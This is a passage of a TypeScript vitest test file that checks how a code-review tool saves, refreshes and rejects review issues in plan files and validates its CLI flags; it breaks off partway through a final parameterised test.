import { vi, expect, test, beforeEach, afterEach, describe } from 'vitest';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  handleReviewCommand,
  buildReviewPrompt,
  buildPlanlessReviewPrompt,
  detectIssuesInReview,
  buildAutofixPrompt,
  reopenParentForAppendedReviewTasks,
  sanitizeBranchName,
  validateFocusAreas,
  resolveReviewTaskScope,
  clearSavedReviewIssues,
  listSavedReviewIssues,
  resolveSavedReviewIssues,
  persistReviewIssueDisposition,
  rejectReviewIssue,
  handleReviewIssuesListCommand,
  handleReviewIssuesClearCommand,
  handleReviewIssuesRejectCommand,
  type ReviewIssueDisposition,
} from './review.js';
import { validateInstructionsFilePath } from '../utils/file_validation.js';
import { REVIEW_SEVERITY_LEVELS } from '../review_severity.js';
import { generateDiffForReview } from '../review_diff.js';
import type { PlanSchema } from '../planSchema.js';
import type { ReviewIssue } from '../formatters/review_formatter.js';
import { planSchema } from '../planSchema.js';
import type { PlanWithFilename } from '../utils/hierarchy.js';
import { readPlanFile, resolvePlanByNumericId, writePlanFile, writePlanToDb } from '../plans.js';
import * as plansModule from '../plans.js';
import { closeDatabaseForTesting, getDatabase } from '../db/database.js';
import { clearPlanSyncContext } from '../db/plan_sync.js';
import { clearAllTimCaches } from '../../testing.js';
import * as notificationsModule from '../notifications.js';
import * as executorsModule from '../executors/index.js';
import * as configLoaderModule from '../configLoader.js';
import * as contextGatheringModule from '../utils/context_gathering.js';
import * as inputModule from '../../common/input.js';
import * as gitModule from '../../common/git.js';
import * as agentPromptsModule from '../executors/claude_code/agent_prompts.js';
import * as inquirerModule from '@inquirer/prompts';
import * as loggingModule from '../../logging.js';
import * as workspaceSetupModule from '../workspace/workspace_setup.js';
import * as prContextGatheringModule from '../utils/pr_context_gathering.js';
import * as workspaceIdentifierModule from '../assignments/workspace_identifier.js';
import * as headlessModule from '../headless.js';
import type { DiffResult } from '../review_diff.js';
import type { PullRequestReviewTarget } from './review_target.js';

vi.mock('../notifications.js', () => ({
  sendNotification: vi.fn(),
}));

vi.mock('../executors/index.js', () => ({
  buildExecutorAndLog: vi.fn(),
  DEFAULT_EXECUTOR: 'codex-cli',
}));

vi.mock('../configLoader.js', async (importOriginal) => {
  const actual = await importOriginal<typeof configLoaderModule>();
  return {
    ...actual,
    loadEffectiveConfig: vi.fn(),
  };
});

vi.mock('../utils/context_gathering.js', () => ({
  gatherPlanContext: vi.fn(),
}));

vi.mock('../../common/input.js', () => ({
  promptSelect: vi.fn(),
  promptCheckbox: vi.fn(),
}));

vi.mock('../../common/git.js', async (importOriginal) => {
  const actual = await importOriginal<typeof gitModule>();
  return {
    ...actual,
    getGitRoot: vi.fn(),
    getTrunkBranch: vi.fn(),
    getUsingJj: vi.fn(),
    getCurrentCommitHash: vi.fn(),
    getCurrentBranchName: vi.fn(),
    getMergeBase: vi.fn(),
    remoteBranchExists: vi.fn(),
  };
});

vi.mock('../executors/claude_code/agent_prompts.js', async (importOriginal) => {
  const actual = await importOriginal<typeof agentPromptsModule>();
  return {
    ...actual,
    getReviewerPrompt: vi.fn(),
  };
});

vi.mock('@inquirer/prompts', () => ({
  confirm: vi.fn(),
  checkbox: vi.fn(),
  select: vi.fn(),
}));

vi.mock('../../logging.js', async (importOriginal) => {
  const actual = await importOriginal<typeof loggingModule>();
  return {
    ...actual,
    log: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  };
});

vi.mock('../utils/pr_context_gathering.js', async (importOriginal) => {
  const actual = await importOriginal<typeof prContextGatheringModule>();
  return {
    ...actual,
    gatherPrContext: vi.fn(),
  };
});

vi.mock('../assignments/workspace_identifier.js', async (importOriginal) => {
  const actual = await importOriginal<typeof workspaceIdentifierModule>();
  return {
    ...actual,
    getRepositoryIdentity: vi.fn(),
  };
});

vi.mock('../headless.js', async (importOriginal) => {
  const actual = await importOriginal<typeof headlessModule>();
  return {
    ...actual,
    updateHeadlessSessionInfo: vi.fn(),
  };
});

let testDir: string;
let sendNotificationSpy: ReturnType<typeof vi.fn>;
let originalCwd: string;
let originalXdgConfigHome: string | undefined;
let originalTimInteractive: string | undefined;
let promptSelectSpy: ReturnType<typeof vi.fn>;
let promptCheckboxSpy: ReturnType<typeof vi.fn>;

function createMockPlanContext(overrides: Record<string, unknown> = {}) {
  return {
    repoRoot: testDir,
    gitRoot: testDir,
    ...overrides,
  };
}

async function createCommittedBaseline(repoDir: string): Promise<void> {
  await writeFile(join(repoDir, 'README.md'), '# baseline\n');
  await Bun.$`git add README.md`.cwd(repoDir).quiet();
  await Bun.$`git -c user.name=Test -c user.email=test@example.com commit -m baseline`
    .cwd(repoDir)
    .quiet();
  await Bun.$`git branch -M main`.cwd(repoDir).quiet();
}

async function createTrackedWorktreeChange(
  repoDir: string,
  fileName: string,
  initialContent: string,
  changedContent: string
): Promise<void> {
  await writeFile(join(repoDir, fileName), initialContent);
  await Bun.$`git add ${fileName}`.cwd(repoDir).quiet();
  await Bun.$`git -c user.name=Test -c user.email=test@example.com commit -m add-${fileName}`
    .cwd(repoDir)
    .quiet();
  await writeFile(join(repoDir, fileName), changedContent);
}

function createMockReviewExecutor(
  output: string = '{"issues":[],"recommendations":[],"actionItems":[]}'
): { execute: ReturnType<typeof vi.fn> } {
  return {
    execute: vi.fn(async () => output),
  };
}

/**
 * Saves `issues` through the disposition that production actually builds for each mode: a
 * `save` replaces the open queue, an `append` merges its non-blocking remainder into it. The
 * merge form carries no tasks or resolutions so it isolates the save behavior.
 */
async function persistReviewIssueSave(
  planId: number,
  issues: readonly ReviewIssue[],
  repoRoot: string,
  options: { merge?: boolean } = {}
): Promise<void> {
  await persistReviewIssueDisposition(
    planId,
    options.merge === true
      ? {
          kind: 'append',
          tasksToAppend: [],
          issuesToSave: [...issues],
          issuesToResolve: [],
        }
      : { kind: 'save', issuesToSave: [...issues] },
    repoRoot
  );
}

async function persistReviewIssueResolve(
  planId: number,
  issues: readonly ReviewIssue[],
  repoRoot: string
): Promise<number> {
  const result = await persistReviewIssueDisposition(
    planId,
    { kind: 'resolve', issuesToResolve: [...issues] },
    repoRoot
  );
  return result.issuesResolvedCount;
}

async function persistReviewIssueAppend(
  planId: number,
  issues: readonly ReviewIssue[],
  repoRoot: string
): Promise<number> {
  const result = await persistReviewIssueDisposition(
    planId,
    {
      kind: 'append',
      tasksToAppend: [...issues],
      issuesToSave: [],
      issuesToResolve: [],
    },
    repoRoot
  );
  return result.appendedTaskCount;
}

beforeEach(async () => {
  clearAllTimCaches();
  closeDatabaseForTesting();
  clearPlanSyncContext();
  originalCwd = process.cwd();
  originalXdgConfigHome = process.env.XDG_CONFIG_HOME;
  originalTimInteractive = process.env.TIM_INTERACTIVE;
  testDir = await mkdtemp(join(tmpdir(), 'tim-review-test-'));
  await Bun.$`git init`.cwd(testDir).quiet();
  await Bun.$`git remote add origin https://example.com/acme/review-tests.git`.cwd(testDir).quiet();
  process.env.XDG_CONFIG_HOME = join(testDir, 'config');
  process.env.TIM_INTERACTIVE = '1';
  vi.spyOn(console, 'error').mockImplementation(() => {});

  sendNotificationSpy = vi.mocked(notificationsModule.sendNotification);
  sendNotificationSpy.mockResolvedValue(true);
  promptSelectSpy = vi.mocked(inputModule.promptSelect);
  promptCheckboxSpy = vi.mocked(inputModule.promptCheckbox);
  promptSelectSpy.mockResolvedValue('exit-manually-resolved' as any);
  promptCheckboxSpy.mockResolvedValue([] as any);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);
  vi.mocked(gitModule.getMergeBase).mockResolvedValue('HEAD' as any);
  vi.mocked(gitModule.remoteBranchExists).mockResolvedValue(false);
  vi.mocked(workspaceIdentifierModule.getRepositoryIdentity).mockResolvedValue({
    repositoryId: 'github.com__acme__review-tests',
    remoteUrl: 'https://github.com/acme/review-tests.git',
    gitRoot: testDir,
  } as any);
});

afterEach(async () => {
  clearAllTimCaches();
  closeDatabaseForTesting();
  clearPlanSyncContext();
  process.chdir(originalCwd);
  if (originalXdgConfigHome === undefined) {
    delete process.env.XDG_CONFIG_HOME;
  } else {
    process.env.XDG_CONFIG_HOME = originalXdgConfigHome;
  }
  if (originalTimInteractive === undefined) {
    delete process.env.TIM_INTERACTIVE;
  } else {
    process.env.TIM_INTERACTIVE = originalTimInteractive;
  }
  vi.clearAllMocks();
});

describe('review issue disposition persistence', () => {
  test('a save disposition persists issues to the plan file', async () => {
    await writePlanToDb(
      {
        id: 1,
        title: 'Persist review issues',
        goal: 'Verify saved issues round-trip',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const issues = [
      {
        id: 'issue-1',
        severity: 'major' as const,
        category: 'bug' as const,
        content: 'A saved issue',
        file: 'src/example.ts',
        line: 12,
        suggestion: 'Add a guard clause',
      },
      {
        id: 'issue-2',
        severity: 'minor' as const,
        category: 'testing' as const,
        content: 'Add a regression test',
        line: '24-30',
      },
    ];

    await persistReviewIssueSave(1, issues, testDir);

    const updatedPlan = (await resolvePlanByNumericId(1, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual(issues);
  });

  test('rejectReviewIssue appends and refreshes a finding without duplicating it', async () => {
    const issue = {
      id: 'issue-reject-command',
      severity: 'major' as const,
      category: 'bug',
      content: 'The existing behavior looks suspicious but is intentional.',
      file: 'src/example.ts',
      line: 42,
      suggestion: 'Change the behavior',
    };
    await writePlanToDb(
      {
        id: 30,
        title: 'Reject review issue',
        goal: 'Record review dispositions',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    await expect(
      rejectReviewIssue(30, issue, 'Required by the public API.', testDir)
    ).resolves.toEqual({ created: true });
    const firstPlan = (await resolvePlanByNumericId(30, testDir)).plan;
    const firstRejectedAt = firstPlan.reviewIssues?.[0]?.rejectedAt;
    expect(firstPlan.reviewIssues).toEqual([
      {
        ...issue,
        rejected: true,
        rejectedReason: 'Required by the public API.',
        rejectedAt: firstRejectedAt,
      },
    ]);

    await expect(
      rejectReviewIssue(30, { ...issue }, 'Confirmed by the API contract.', testDir)
    ).resolves.toEqual({ created: false });
    const refreshedPlan = (await resolvePlanByNumericId(30, testDir)).plan;
    expect(refreshedPlan.reviewIssues).toHaveLength(1);
    expect(refreshedPlan.reviewIssues?.[0]).toMatchObject({
      ...issue,
      rejected: true,
      rejectedReason: 'Confirmed by the API contract.',
    });
    expect(refreshedPlan.reviewIssues?.[0]?.rejectedAt).toEqual(expect.any(String));
  });

  test('handleReviewIssuesRejectCommand reads an issue from structured review output', async () => {
    await writePlanToDb(
      {
        id: 31,
        title: 'Reject from review output',
        goal: 'Read a structured review result',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    const outputPath = join(testDir, 'review-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        planId: '31',
        issues: [
          {
            id: 'issue-from-review',
            severity: 'minor',
            category: 'style',
            content: 'This naming choice is intentional.',
            file: 'src/example.ts',
            line: '8-9',
            suggestion: 'Rename the value',
            source: 'codex-cli',
          },
        ],
      })
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      31,
      {
        fromReview: outputPath,
        issue: '1',
        reason: 'The name matches the external API.',
      },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(31, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        severity: 'minor',
        category: 'style',
        content: 'This naming choice is intentional.',
        source: 'codex-cli',
        rejected: true,
        rejectedReason: 'The name matches the external API.',
        rejectedAt: expect.any(String),
      }),
    ]);
  });

  test('handleReviewIssuesRejectCommand accepts explicit issue fields and defaults severity and category', async () => {
    await writePlanToDb(
      {
        id: 32,
        title: 'Reject explicit issue',
        goal: 'Record a manually supplied finding',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      32,
      {
        content: 'This is an intentional behavior.',
        file: 'src/manual.ts',
        line: '17',
        reason: 'It is required for compatibility.',
      },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(32, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        severity: 'major',
        category: 'other',
        content: 'This is an intentional behavior.',
        file: 'src/manual.ts',
        line: '17',
        rejected: true,
        rejectedReason: 'It is required for compatibility.',
        rejectedAt: expect.any(String),
      }),
    ]);
  });

  test('handleReviewIssuesRejectCommand reports invalid input clearly', async () => {
    process.chdir(testDir);
    await expect(
      handleReviewIssuesRejectCommand(
        33,
        { reason: 'Not applicable', fromReview: join(testDir, 'missing-review.json'), issue: '1' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(`Could not read review output file ${join(testDir, 'missing-review.json')}`);

    await expect(
      handleReviewIssuesRejectCommand(
        33,
        { reason: 'Not applicable', content: 'Finding', severity: 'urgent' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('Expected one of: critical, major, minor, info.');

    await expect(
      handleReviewIssuesRejectCommand(
        33,
        { reason: 'Not applicable', content: 'Finding', issue: '1' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('--issue can only be used with --from-review.');
  });

  test('handleReviewIssuesRejectCommand reports the full invalid-severity message with valid levels', async () => {
    process.chdir(testDir);

    await expect(
      handleReviewIssuesRejectCommand(
        33,
        { reason: 'Not applicable', content: 'Finding', severity: 'urgent' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(
      `Invalid review issue severity "urgent". Expected one of: ${REVIEW_SEVERITY_LEVELS.join(', ')}.`
    );
  });

  test('handleReviewIssuesRejectCommand rejects each explicit field individually when combined with --from-review', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'combined-flags-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            severity: 'major',
            category: 'bug',
            content: 'A finding from the review output.',
          },
        ],
      })
    );

    const baseOptions = { fromReview: outputPath, issue: '1', reason: 'Not applicable' };
    const cases: Array<[string, Record<string, string>]> = [
      ['--file', { file: 'src/other.ts' }],
      ['--line', { line: '10' }],
      ['--severity', { severity: 'critical' }],
      ['--category', { category: 'security' }],
      ['--suggestion', { suggestion: 'Do something else.' }],
    ];

    for (const [flag, extra] of cases) {
      await expect(
        handleReviewIssuesRejectCommand(
          43,
          { ...baseOptions, ...extra },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow(`${flag} cannot be combined with --from-review`);
    }
  });

  test('handleReviewIssuesRejectCommand names every offending flag when several are combined with --from-review', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'combined-flags-multi-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            severity: 'major',
            category: 'bug',
            content: 'A finding from the review output.',
          },
        ],
      })
    );

    await expect(
      handleReviewIssuesRejectCommand(
        43,
        {
          fromReview: outputPath,
          issue: '1',
          reason: 'Not applicable',
          file: 'src/other.ts',
          line: '10',
          severity: 'critical',
          category: 'security',
          suggestion: 'Do something else.',
        },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(
      '--file, --line, --severity, --category, --suggestion cannot be combined with --from-review'
    );
  });

  test('handleReviewIssuesRejectCommand still allows --issue/--reason with --from-review and the explicit-field path', async () => {
    await writePlanToDb(
      {
        id: 44,
        title: 'Valid flag combinations still work',
        goal: 'Only the invalid combination should throw',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    const outputPath = join(testDir, 'valid-combo-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            severity: 'major',
            category: 'bug',
            content: 'A finding from the review output.',
          },
        ],
      })
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      44,
      { fromReview: outputPath, issue: '1', reason: 'Only --issue and --reason supplied.' },
      { parent: { opts: () => ({}) } }
    );
    const afterFromReview = (await resolvePlanByNumericId(44, testDir)).plan;
    expect(afterFromReview.reviewIssues).toEqual([
      expect.objectContaining({
        content: 'A finding from the review output.',
        rejected: true,
        rejectedReason: 'Only --issue and --reason supplied.',
      }),
    ]);

    await handleReviewIssuesRejectCommand(
      44,
      {
        content: 'A separate explicit finding.',
        file: 'src/explicit.ts',
        line: '3',
        severity: 'critical',
        category: 'security',
        suggestion: 'Add validation.',
        reason: 'The explicit-field path allows these flags together.',
      },
      { parent: { opts: () => ({}) } }
    );
    const afterExplicit = (await resolvePlanByNumericId(44, testDir)).plan;
    expect(afterExplicit.reviewIssues).toHaveLength(2);
    expect(afterExplicit.reviewIssues?.[1]).toMatchObject({
      content: 'A separate explicit finding.',
      file: 'src/explicit.ts',
      line: '3',
      severity: 'critical',
      category: 'security',
      suggestion: 'Add validation.',
      rejected: true,
      rejectedReason: 'The explicit-field path allows these flags together.',
    });
  });

  test('handleReviewIssuesRejectCommand allowlists fields from --from-review', async () => {
    await writePlanToDb(
      {
        id: 40,
        title: 'Reject with unknown fields removed',
        goal: 'Only known review issue fields should be stored from review output',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    const outputPath = join(testDir, 'unknown-fields-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            id: 'reviewer-generated-id',
            source: 'codex-cli',
            severity: 'major',
            category: 'bug',
            content: 'A finding with reviewer-only metadata.',
            file: 'src/meta.ts',
            line: '7',
          },
        ],
      })
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      40,
      {
        fromReview: outputPath,
        issue: '1',
        reason: 'The source metadata is useful; positional IDs are not.',
      },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(40, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        source: 'codex-cli',
        content: 'A finding with reviewer-only metadata.',
        rejected: true,
        rejectedReason: 'The source metadata is useful; positional IDs are not.',
      }),
    ]);
    expect(updatedPlan.reviewIssues?.[0]).not.toHaveProperty('id');
  });

  test('handleReviewIssuesRejectCommand rejects only the selected issue from a multi-issue --from-review file', async () => {
    await writePlanToDb(
      {
        id: 34,
        title: 'Reject a single issue from a multi-issue file',
        goal: 'Only the selected issue should be recorded',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    const outputPath = join(testDir, 'multi-review-output.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        planId: '34',
        planTitle: 'Reject a single issue from a multi-issue file',
        reviewTimestamp: '2026-08-03T10:00:00.000Z',
        baseBranch: 'main',
        summary: 'Three issues found.',
        issues: [
          {
            id: 'issue-one',
            severity: 'major',
            category: 'bug',
            content: 'First issue.',
            file: 'src/one.ts',
            line: '1',
          },
          {
            id: 'issue-two',
            severity: 'minor',
            category: 'style',
            content: 'Second issue, intentional naming.',
            file: 'src/two.ts',
            line: '2',
          },
          {
            id: 'issue-three',
            severity: 'critical',
            category: 'security',
            content: 'Third issue.',
            file: 'src/three.ts',
            line: '3',
          },
        ],
        recommendations: [],
        actionItems: [],
      })
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      34,
      { fromReview: outputPath, issue: '2', reason: 'Naming is intentional here.' },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(34, testDir)).plan;
    expect(updatedPlan.reviewIssues).toHaveLength(1);
    expect(updatedPlan.reviewIssues?.[0]).toMatchObject({
      content: 'Second issue, intentional naming.',
      rejected: true,
      rejectedReason: 'Naming is intentional here.',
    });
  });

  test('handleReviewIssuesRejectCommand reads a bare top-level array from --from-review', async () => {
    await writePlanToDb(
      {
        id: 35,
        title: 'Reject from bare array',
        goal: 'A --from-review file may be a bare array of issues',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    const outputPath = join(testDir, 'bare-array-output.json');
    await writeFile(
      outputPath,
      JSON.stringify([
        {
          id: 'array-issue-one',
          severity: 'minor',
          category: 'style',
          content: 'A bare-array finding.',
        },
      ])
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      35,
      { fromReview: outputPath, issue: '1', reason: 'Bare array form works.' },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(35, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        content: 'A bare-array finding.',
        rejected: true,
        rejectedReason: 'Bare array form works.',
      }),
    ]);
  });

  test('handleReviewIssuesRejectCommand accepts --content alone and applies all defaults', async () => {
    await writePlanToDb(
      {
        id: 36,
        title: 'Reject with content only',
        goal: 'Verify defaults for severity and category',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      36,
      { content: 'A finding described with content only.', reason: 'No file context needed.' },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(36, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        severity: 'major',
        category: 'other',
        content: 'A finding described with content only.',
        rejected: true,
        rejectedReason: 'No file context needed.',
      }),
    ]);
    expect(updatedPlan.reviewIssues?.[0]).not.toHaveProperty('file');
    expect(updatedPlan.reviewIssues?.[0]).not.toHaveProperty('line');
  });

  test('handleReviewIssuesRejectCommand accepts explicit severity, category, and suggestion overrides', async () => {
    await writePlanToDb(
      {
        id: 37,
        title: 'Reject with full explicit fields',
        goal: 'Verify explicit overrides are respected',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      37,
      {
        content: 'A fully specified manual finding.',
        file: 'src/full.ts',
        line: '42',
        severity: 'critical',
        category: 'security',
        suggestion: 'Consider input validation.',
        reason: 'Already mitigated elsewhere.',
      },
      { parent: { opts: () => ({}) } }
    );

    const updatedPlan = (await resolvePlanByNumericId(37, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({
        content: 'A fully specified manual finding.',
        file: 'src/full.ts',
        line: '42',
        severity: 'critical',
        category: 'security',
        suggestion: 'Consider input validation.',
        rejected: true,
        rejectedReason: 'Already mitigated elsewhere.',
      }),
    ]);
  });

  test('rejecting an issue already saved by a prior review upserts it in place without growing the array', async () => {
    await writePlanToDb(
      {
        id: 38,
        title: 'Upsert against a previously saved issue',
        goal: 'Rejecting a saved finding should update it in place',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const savedIssue = {
      id: 'saved-issue',
      severity: 'minor' as const,
      category: 'style',
      content: 'A previously saved, non-rejected finding.',
      file: 'src/saved.ts',
      line: 5,
    };
    const otherIssue = {
      id: 'other-issue',
      severity: 'major' as const,
      category: 'bug',
      content: 'A different finding that stays untouched.',
      file: 'src/other.ts',
      line: 9,
    };
    await persistReviewIssueSave(38, [savedIssue, otherIssue], testDir);

    const outputPath = join(testDir, 'existing-issue-review.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            id: 'saved-issue',
            severity: 'minor',
            category: 'style',
            content: 'A previously saved, non-rejected finding.',
            file: 'src/saved.ts',
            line: 5,
          },
        ],
      })
    );
    process.chdir(testDir);

    const logSpy = vi.mocked(loggingModule.log);
    logSpy.mockClear();
    await handleReviewIssuesRejectCommand(
      38,
      { fromReview: outputPath, issue: '1', reason: 'Confirmed intentional.' },
      { parent: { opts: () => ({}) } }
    );
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain('Refreshed an existing rejection');

    const updatedPlan = (await resolvePlanByNumericId(38, testDir)).plan;
    expect(updatedPlan.reviewIssues).toHaveLength(2);
    expect(updatedPlan.reviewIssues?.[0]).toMatchObject({
      id: 'saved-issue',
      content: 'A previously saved, non-rejected finding.',
      rejected: true,
      rejectedReason: 'Confirmed intentional.',
    });
    expect(updatedPlan.reviewIssues?.[1]).toEqual(otherIssue);

    // A brand-new finding (no matching identity) should be appended and reported as created.
    const brandNewOutputPath = join(testDir, 'brand-new-issue-review.json');
    await writeFile(
      brandNewOutputPath,
      JSON.stringify({
        issues: [
          {
            id: 'brand-new-issue',
            severity: 'major',
            category: 'bug',
            content: 'A finding not previously saved.',
          },
        ],
      })
    );
    logSpy.mockClear();
    await handleReviewIssuesRejectCommand(
      38,
      { fromReview: brandNewOutputPath, issue: '1', reason: 'Not applicable here.' },
      { parent: { opts: () => ({}) } }
    );
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain('Recorded a new rejection');
    expect((await resolvePlanByNumericId(38, testDir)).plan.reviewIssues).toHaveLength(3);
  });

  test('rejection survives a save disposition and the default clearSavedReviewIssues path', async () => {
    await writePlanToDb(
      {
        id: 39,
        title: 'Rejection survives the review lifecycle',
        goal: 'A rejection recorded via the command must not be resurrected or duplicated',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const outputPath = join(testDir, 'lifecycle-review.json');
    await writeFile(
      outputPath,
      JSON.stringify({
        issues: [
          {
            id: 'lifecycle-issue',
            severity: 'minor',
            category: 'style',
            content: 'Finding that will be rejected then re-reported.',
            file: 'src/lifecycle.ts',
            line: 3,
          },
        ],
      })
    );
    process.chdir(testDir);

    await handleReviewIssuesRejectCommand(
      39,
      { fromReview: outputPath, issue: '1', reason: 'Not a real problem.' },
      { parent: { opts: () => ({}) } }
    );

    // A later review re-reports the same finding as a fresh, non-rejected issue plus a new one.
    await persistReviewIssueSave(
      39,
      [
        {
          id: 'lifecycle-issue',
          severity: 'minor',
          category: 'style',
          content: 'Finding that will be rejected then re-reported.',
          file: 'src/lifecycle.ts',
          line: 3,
        },
        {
          id: 'fresh-issue',
          severity: 'major',
          category: 'bug',
          content: 'A new finding from the later review.',
        },
      ],
      testDir
    );

    const afterSave = (await resolvePlanByNumericId(39, testDir)).plan;
    expect(afterSave.reviewIssues).toHaveLength(2);
    expect(afterSave.reviewIssues?.[0]).toMatchObject({
      content: 'Finding that will be rejected then re-reported.',
      rejected: true,
    });
    expect(afterSave.reviewIssues?.[1]).toMatchObject({ id: 'fresh-issue' });
    expect(afterSave.reviewIssues?.[1]).not.toHaveProperty('rejected');

    // A clean review (no remaining actionable issues) clears the fresh issue but keeps the rejection.
    await clearSavedReviewIssues(39, testDir);
    const afterClear = (await resolvePlanByNumericId(39, testDir)).plan;
    expect(afterClear.reviewIssues).toEqual([
      expect.objectContaining({
        content: 'Finding that will be rejected then re-reported.',
        rejected: true,
      }),
    ]);
  });

  test('handleReviewIssuesRejectCommand rejects an empty or whitespace-only --reason', async () => {
    process.chdir(testDir);
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { content: 'Finding', reason: '' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('--reason is required.');

    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { content: 'Finding', reason: '   ' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('--reason is required.');
  });

  test('handleReviewIssuesRejectCommand rejects both --from-review and --content together', async () => {
    process.chdir(testDir);
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        {
          reason: 'Not applicable',
          fromReview: join(testDir, 'unused.json'),
          content: 'Finding',
          issue: '1',
        },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('Provide either --from-review or --content, not both.');
  });

  test('handleReviewIssuesRejectCommand requires --issue when --from-review is provided', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'no-issue-arg.json');
    await writeFile(outputPath, JSON.stringify({ issues: [{ content: 'x' }] }));
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { reason: 'Not applicable', fromReview: outputPath },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow('--issue is required when --from-review is provided.');
  });

  test('handleReviewIssuesRejectCommand requires either --from-review or --content', async () => {
    process.chdir(testDir);
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { reason: 'Not applicable' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(
      'Provide either --from-review <path> with --issue <n> or --content <text> to identify the review issue.'
    );
  });

  test('handleReviewIssuesRejectCommand reports a clear error for invalid JSON in --from-review', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'invalid.json');
    await writeFile(outputPath, '{ this is not valid json');
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { reason: 'Not applicable', fromReview: outputPath, issue: '1' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(`Could not parse review output file ${outputPath} as JSON`);
  });

  test('handleReviewIssuesRejectCommand reports a clear error when --from-review JSON has no issues array', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'no-issues-array.json');
    await writeFile(outputPath, JSON.stringify({ planId: '1', summary: 'nothing useful here' }));
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { reason: 'Not applicable', fromReview: outputPath, issue: '1' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(`must contain an "issues" array or be a top-level array of issues`);
  });

  test('handleReviewIssuesRejectCommand reports a clear error when --from-review has an empty issues array', async () => {
    process.chdir(testDir);
    const outputPath = join(testDir, 'empty-issues.json');
    await writeFile(outputPath, JSON.stringify({ issues: [] }));
    await expect(
      handleReviewIssuesRejectCommand(
        40,
        { reason: 'Not applicable', fromReview: outputPath, issue: '1' },
        { parent: { opts: () => ({}) } }
      )
    ).rejects.toThrow(`contains no issues`);
  });

  test.each([
    ['0', 'must be a positive integer'],
    ['-1', 'must be a positive integer'],
    ['abc', 'must be a positive integer'],
    ['5', 'is out of range'],
  ])(
    'handleReviewIssuesRejectCommand reports a clear error for --issue %s',
